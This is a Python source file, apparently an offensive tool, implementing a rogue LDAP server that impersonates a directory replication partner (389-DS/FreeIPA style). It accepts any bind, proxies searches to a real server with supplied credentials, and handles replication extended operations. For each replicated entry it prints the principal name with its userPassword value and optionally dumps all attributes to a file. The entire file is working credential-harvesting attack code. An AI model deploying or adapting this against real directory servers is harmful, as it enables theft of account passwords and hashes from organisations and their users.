from ldaptor.protocols import pureldap
from ldaptor.protocols.ldap import distinguishedname, ldaperrors

from twisted.internet import reactor
from twisted.internet.protocol import ServerFactory
from ldaptor.protocols.ldap.ldapserver import LDAPServer

from ldaptor.protocols.ldap.ldapclient import LDAPClient
from ldaptor.protocols.ldap.ldapsyntax import LDAPEntry
from twisted.internet.defer import inlineCallbacks
from twisted.internet.endpoints import clientFromString, connectProtocol
from twisted.python import log

from ber_parser import create_ldap_object


class LDAPServerWithExopSupport(LDAPServer):
    def handle_LDAPBindRequest(self, request, controls, reply):
        if request.version != 3:
            raise ldaperrors.LDAPProtocolError(
                "Version %u not supported" % request.version
            )
        self.checkControls(controls)
        if request.dn == b"":
            # anonymous bind
            self.boundUser = None
            return pureldap.LDAPBindResponse(resultCode=0)
        msg = pureldap.LDAPBindResponse(
            resultCode=ldaperrors.Success.resultCode
        )
        return msg

    def handle_LDAPSearchRequest(self, request, controls, reply):
        self.checkControls(controls)

        @inlineCallbacks
        def performSearch():
            try:
                remote_host = self.factory.ldap_url.split("//")[1].split(":")[0]
                remote_port = 389
                if len(self.factory.ldap_url.split(":")) > 3:
                    remote_port = self.factory.ldap_url.split(":")[4]
                endpoint_str = "tcp:host={}:port={}".format(remote_host, remote_port)
                e = clientFromString(reactor, endpoint_str)
                clientProtocol = yield connectProtocol(e, LDAPClient())

                yield clientProtocol.bind(
                    self.factory.user_dn,
                    self.factory.password
                )

                base_dn = distinguishedname.DistinguishedName(request.baseObject)
                entry = LDAPEntry(clientProtocol, base_dn)
                results = yield entry.search(filterObject=request.filter,
                                             attributes=request.attributes,
                                             scope=request.scope,
                                             )

                # Формируем ответ из результатов LDAP
                for result in results:
                    reply(
                        pureldap.LDAPSearchResultEntry(
                            objectName=result.dn.getText(),
                            attributes=[
                                (attr, values)    # Атрибуты также должны быть строками
                                for attr, values in result.items()
                            ]
                        )
                    )

                # Завершаем операцию
                reply(pureldap.LDAPSearchResultDone(
                    resultCode=ldaperrors.Success.resultCode
                ))
                return pureldap.LDAPSearchResultDone(resultCode=ldaperrors.Success.resultCode)

            except Exception as e:
                log.err(f"LDAP search failed: {e}")
                reply(pureldap.LDAPSearchResultDone(
                    resultCode=ldaperrors.LDAPProtocolError.resultCode
                ))
                return pureldap.LDAPSearchResultDone(resultCode=ldaperrors.LDAPProtocolError.resultCode)

        try:
            if b"nsschemacsn" in request.attributes:
                reply(pureldap.LDAPSearchResultEntry(
                    objectName=b"cn=schema",
                    attributes=[]
                ))
                return pureldap.LDAPSearchResultDone(resultCode=ldaperrors.Success.resultCode)
        except Exception as e:
            pass

        # Запускаем асинхронный поиск
        return performSearch()


    def handle_LDAPModifyRequest(self, request, controls, reply):
        self.checkControls(controls)
        return pureldap.LDAPModifyDNResponse(resultCode=0)


    def handle_LDAPExtendedRequest(self, request, controls, reply):
        self.checkControls(controls)

        if request.requestName == b"2.16.840.1.113730.3.5.12":
            return pureldap.LDAPExtendedResponse(
                resultCode=0,
                responseName=b"2.16.840.1.113730.3.5.13",
                response=b"0\003\n\001\000",
            )
        elif request.requestName == b"2.16.840.1.113730.3.5.6":
            ldap_object = create_ldap_object(request.requestValue)
            if 'userPassword' in ldap_object.attributes:
                if 'krbPrincipalName' in ldap_object.attributes:
                    print(f"[*] {ldap_object.attributes['krbPrincipalName'][0]}:{ldap_object.attributes['userPassword'][0]}")
                else:
                    print(f"[*] {ldap_object.attributes['entrydn'][0]}:{ldap_object.attributes['userPassword'][0]}")

            if self.factory.all:
                rdn = 'id {}\n'.format(self.id)
                for attr_key in ldap_object.attributes:
                    for attr_value in ldap_object.attributes[attr_key]:
                        rdn += f'\t{attr_key}: {attr_value}\n'
                rdn += '\t\n'
                with open(self.factory.all, 'a') as f:
                    f.write(rdn)

                self.id += 1

            return pureldap.LDAPExtendedResponse(
                resultCode=0
            )

        raise ldaperrors.LDAPProtocolError(
            b"Unknown extended request: %s" % request.requestName
        )


class LDAPServerFactory(ServerFactory):

    protocol = LDAPServerWithExopSupport

    def __init__(self, user_dn, password, all, ldap_url):
        self.user_dn = user_dn
        self.password = password
        self.all = all
        self.ldap_url = ldap_url
        if all:
            with open(self.all, 'w') as f:
                f.write('')

    def buildProtocol(self, addr):
        proto = self.protocol()
        proto.debug = self.debug
        proto.factory = self
        proto.id = 1
        return proto

